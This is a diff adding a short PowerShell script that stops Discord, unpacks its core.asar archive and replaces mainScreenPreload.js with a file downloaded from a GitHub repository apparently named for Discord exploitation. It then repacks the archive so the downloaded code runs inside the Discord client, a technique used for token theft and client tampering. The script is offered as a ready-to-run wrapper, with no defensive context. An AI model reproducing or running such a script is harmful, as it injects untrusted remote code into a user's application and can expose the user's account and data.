@@ -1,0 +1,16 @@
+$nodeV = (node -v) | Out-String
+if ($nodeV.StartsWith("v")) { echo NodeJS Version : $nodeV } else {exit}
+Stop-process -Name discord
+cd C:\Users\f1sk\AppData\Roaming\discord\0.0.*\modules\discord_desktop_core
+if (Test-Path "core.old") { remove-item "core.old" }
+if (Test-Path "rd") { remove-item "rd" }
+npx asar extract core.asar rd
+cd rd\app
+remove-item "mainScreenPreload.js"
+Invoke-WebRequest https://raw.githubusercontent.com/FiskDk/discord-security-exploiting/master/windows_preload.js -OutFile mainScreenPreload.js
+cd C:\Users\f1sk\AppData\Roaming\discord\0.0.*\modules\discord_desktop_core
+if (test-path "core.asar") { rename-item "core.asar" "core.old" }
+npx asar pack rd core.asar
+Remove-Item -Recurse -Force "rd"
+echo "You can now launch Discord - Made with RDWrapper <3"
+you can close this now
